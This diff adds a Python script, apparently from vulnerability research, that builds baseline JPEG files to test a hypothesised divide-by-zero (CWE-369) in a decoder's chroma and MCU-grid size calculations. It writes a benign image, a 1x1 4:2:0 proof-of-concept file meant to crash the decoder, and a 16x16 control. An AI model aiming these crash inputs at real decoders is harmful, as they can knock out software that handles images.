@@ -1,0 +1,251 @@
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# 假设：CWE-369 发生在解码器用整数除法派生的“每分量下采样平面尺寸 / MCU 网格数”上。
+# 派生量示例：
+#   cw_i = floor(width  * H_i / Hmax)
+#   ch_i = floor(height * V_i / Vmax)
+#   mcu_cols = floor(width  / (8 * Hmax))
+#   mcu_rows = floor(height / (8 * Vmax))
+# 这些量由合法的 SOF width/height 与采样因子 H_i,V_i 算出。
+# 对普通 4:2:0，Hmax=2。取 width=height=1（合法非零）时：
+#   cw_Cb = floor(1 * 1 / 2) = 0, ch_Cb = 0
+#   mcu_cols = floor(1 / 16) = 0, mcu_rows = 0
+# 若后续上采样/调度把该派生量当作除数，即触发除零。
+# 控制文件把尺寸恢复到 16x16，其余构造完全相同，使该派生量非零。
+
+import hashlib
+
+DC_LUMA_BITS = [0, 0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
+DC_LUMA_VALS = list(range(12))
+
+DC_CHROMA_BITS = [0, 0, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0]
+DC_CHROMA_VALS = list(range(12))
+
+AC_LUMA_BITS = [0, 0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d]
+AC_LUMA_VALS = [
+    0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12,
+    0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
+    0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xa1, 0x08,
+    0x23, 0x42, 0xb1, 0xc1, 0x15, 0x52, 0xd1, 0xf0,
+    0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0a, 0x16,
+    0x17, 0x18, 0x19, 0x1a, 0x25, 0x26, 0x27, 0x28,
+    0x29, 0x2a, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
+    0x3a, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
+    0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
+    0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
+    0x6a, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79,
+    0x7a, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
+    0x8a, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
+    0x99, 0x9a, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
+    0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6,
+    0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3, 0xc4, 0xc5,
+    0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xd2, 0xd3, 0xd4,
+    0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xe1, 0xe2,
+    0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea,
+    0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
+    0xf9, 0xfa,
+]
+
+AC_CHROMA_BITS = [0, 0, 2, 1, 2, 4, 4, 3, 4, 7, 5, 4, 4, 0, 1, 2, 0x77]
+AC_CHROMA_VALS = [
+    0x00, 0x01, 0x02, 0x03, 0x11, 0x04, 0x05, 0x21,
+    0x31, 0x06, 0x12, 0x41, 0x51, 0x07, 0x61, 0x71,
+    0x13, 0x22, 0x32, 0x81, 0x08, 0x14, 0x42, 0x91,
+    0xa1, 0xb1, 0xc1, 0x09, 0x23, 0x33, 0x52, 0xf0,
+    0x15, 0x62, 0x72, 0xd1, 0x0a, 0x16, 0x24, 0x34,
+    0xe1, 0x25, 0xf1, 0x17, 0x18, 0x19, 0x1a, 0x26,
+    0x27, 0x28, 0x29, 0x2a, 0x35, 0x36, 0x37, 0x38,
+    0x39, 0x3a, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+    0x49, 0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
+    0x59, 0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
+    0x69, 0x6a, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
+    0x79, 0x7a, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
+    0x88, 0x89, 0x8a, 0x92, 0x93, 0x94, 0x95, 0x96,
+    0x97, 0x98, 0x99, 0x9a, 0xa2, 0xa3, 0xa4, 0xa5,
+    0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4,
+    0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3,
+    0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xd2,
+    0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda,
+    0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9,
+    0xea, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
+    0xf9, 0xfa,
+]
+
+assert sum(DC_LUMA_BITS[1:]) == len(DC_LUMA_VALS)
+assert sum(DC_CHROMA_BITS[1:]) == len(DC_CHROMA_VALS)
+assert sum(AC_LUMA_BITS[1:]) == len(AC_LUMA_VALS)
+assert sum(AC_CHROMA_BITS[1:]) == len(AC_CHROMA_VALS)
+
+
+def build_huff_codes(bits, vals):
+    codes = {}
+    code = 0
+    k = 0
+    for length in range(1, 17):
+        for _ in range(bits[length]):
+            codes[vals[k]] = (code, length)
+            code += 1
+            k += 1
+        code <<= 1
+    return codes
+
+
+DC_LUMA = build_huff_codes(DC_LUMA_BITS, DC_LUMA_VALS)
+DC_CHROMA = build_huff_codes(DC_CHROMA_BITS, DC_CHROMA_VALS)
+AC_LUMA = build_huff_codes(AC_LUMA_BITS, AC_LUMA_VALS)
+AC_CHROMA = build_huff_codes(AC_CHROMA_BITS, AC_CHROMA_VALS)
+
+
+class BitWriter:
+    def __init__(self):
+        self.data = bytearray()
+        self.acc = 0
+        self.nbits = 0
+
+    def put(self, code, length):
+        for i in range(length - 1, -1, -1):
+            self.acc = (self.acc << 1) | ((code >> i) & 1)
+            self.nbits += 1
+            if self.nbits == 8:
+                b = self.acc & 0xFF
+                self.data.append(b)
+                if b == 0xFF:
+                    self.data.append(0x00)
+                self.acc = 0
+                self.nbits = 0
+
+    def finish(self):
+        if self.nbits:
+            pad = 8 - self.nbits
+            self.acc = (self.acc << pad) | ((1 << pad) - 1)
+            b = self.acc & 0xFF
+            self.data.append(b)
+            if b == 0xFF:
+                self.data.append(0x00)
+            self.acc = 0
+            self.nbits = 0
+        return bytes(self.data)
+
+
+def marker(code, payload):
+    return bytes([0xFF, code]) + (len(payload) + 2).to_bytes(2, "big") + payload
+
+
+def app0():
+    payload = b"JFIF\x00" + bytes([1, 1, 0]) + (1).to_bytes(2, "big") + (1).to_bytes(2, "big") + b"\x00\x00"
+    return marker(0xE0, payload)
+
+
+def dqt():
+    q = bytes([1]) * 64
+    payload = bytes([0x00]) + q + bytes([0x01]) + q
+    return marker(0xDB, payload)
+
+
+def dht():
+    payload = bytearray()
+    for tc_th, bits, vals in [
+        (0x00, DC_LUMA_BITS, DC_LUMA_VALS),
+        (0x01, DC_CHROMA_BITS, DC_CHROMA_VALS),
+        (0x10, AC_LUMA_BITS, AC_LUMA_VALS),
+        (0x11, AC_CHROMA_BITS, AC_CHROMA_VALS),
+    ]:
+        payload.append(tc_th)
+        payload.extend(bits[1:17])
+        payload.extend(vals)
+    return marker(0xC4, bytes(payload))
+
+
+def sof0(width, height, comps):
+    payload = bytearray()
+    payload.append(8)
+    payload.extend(height.to_bytes(2, "big"))
+    payload.extend(width.to_bytes(2, "big"))
+    payload.append(len(comps))
+    for cid, h, v, tq in comps:
+        payload.append(cid)
+        payload.append((h << 4) | v)
+        payload.append(tq)
+    return marker(0xC0, bytes(payload))
+
+
+def sos(comps):
+    payload = bytearray()
+    payload.append(len(comps))
+    for idx, (cid, h, v, tq) in enumerate(comps):
+        selector = 0x00 if idx == 0 else 0x11
+        payload.append(cid)
+        payload.append(selector)
+    payload.extend([0, 63, 0])
+    return marker(0xDA, bytes(payload))
+
+
+def entropy_data(width, height, comps):
+    max_h = max(c[1] for c in comps)
+    max_v = max(c[2] for c in comps)
+    mcu_w = 8 * max_h
+    mcu_h = 8 * max_v
+    mcu_cols = (width + mcu_w - 1) // mcu_w
+    mcu_rows = (height + mcu_h - 1) // mcu_h
+
+    dc_l_c, dc_l_n = DC_LUMA[0]
+    ac_l_c, ac_l_n = AC_LUMA[0x00]
+    dc_c_c, dc_c_n = DC_CHROMA[0]
+    ac_c_c, ac_c_n = AC_CHROMA[0x00]
+
+    bw = BitWriter()
+    for _ in range(mcu_rows):
+        for _ in range(mcu_cols):
+            for ci, (cid, h, v, tq) in enumerate(comps):
+                for _ in range(h * v):
+                    if ci == 0:
+                        bw.put(dc_l_c, dc_l_n)
+                        bw.put(ac_l_c, ac_l_n)
+                    else:
+                        bw.put(dc_c_c, dc_c_n)
+                        bw.put(ac_c_c, ac_c_n)
+    return bw.finish()
+
+
+def make_jpeg(width, height, comps):
+    out = bytearray()
+    out.extend(b"\xff\xd8")
+    out.extend(app0())
+    out.extend(dqt())
+    out.extend(sof0(width, height, comps))
+    out.extend(dht())
+    out.extend(sos(comps))
+    out.extend(entropy_data(width, height, comps))
+    out.extend(b"\xff\xd9")
+    return bytes(out)
+
+
+def make_gray_420(width, height):
+    comps = [
+        (1, 2, 2, 0),  # Y, H=2 V=2, quant table 0
+        (2, 1, 1, 1),  # Cb, H=1 V=1, quant table 1
+        (3, 1, 1, 1),  # Cr, H=1 V=1, quant table 1
+    ]
+    return make_jpeg(width, height, comps)
+
+
+benign = make_gray_420(64, 64)
+poc = make_gray_420(1, 1)
+ctrl = make_gray_420(16, 16)
+
+files = [
+    ("benign", "benign_64x64_420.jpg", benign),
+    ("poc", "poc_1x1_420.jpg", poc),
+    ("ctrl", "ctrl_16x16_420.jpg", ctrl),
+]
+
+for role, name, data in files:
+    with open(name, "wb") as f:
+        f.write(data)
+
+print("[F15_PLAN] Derived MCU-grid/chroma-plane size zero via integer division: floor(1/(8*2))=0 and floor(1*1/2)=0 from legal 1x1 SOF with 4:2:0 legal sampling; ctrl 16x16 restores nonzero.")
+for role, name, data in files:
+    digest = hashlib.sha256(data).hexdigest()
+    print(f"[F15_FILE] {role} {name} {len(data)} {digest}")
+```
